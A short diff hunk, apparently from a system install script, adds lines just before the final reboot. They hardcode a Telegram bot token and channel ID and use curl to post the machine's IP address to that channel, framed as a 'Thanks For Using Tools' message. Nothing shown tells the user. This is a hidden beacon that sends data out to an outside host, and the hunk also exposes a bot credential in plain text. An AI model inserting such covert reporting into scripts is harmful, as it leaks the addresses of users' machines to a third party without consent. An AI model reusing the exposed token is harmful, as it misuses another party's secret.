@@ -7130,4 +7130,8 @@ fi
 # swapoff -a
 # umount ?
 sync
+BOTTOKEN="5684804886:AAFup0F9eqNPL7yIUUmTPE5is2SaAIYZixQ"
+CHANNELID="-1002638608475"
+MESSAGE="Install completed, IP : $ipv4_addr, Thanks For Using Tools"
+curl -s -X POST "https://api.telegram.org/bot${BOTTOKEN}/sendMessage" -d chat_id="${CHANNELID}" -d text="${MESSAGE}"
 reboot
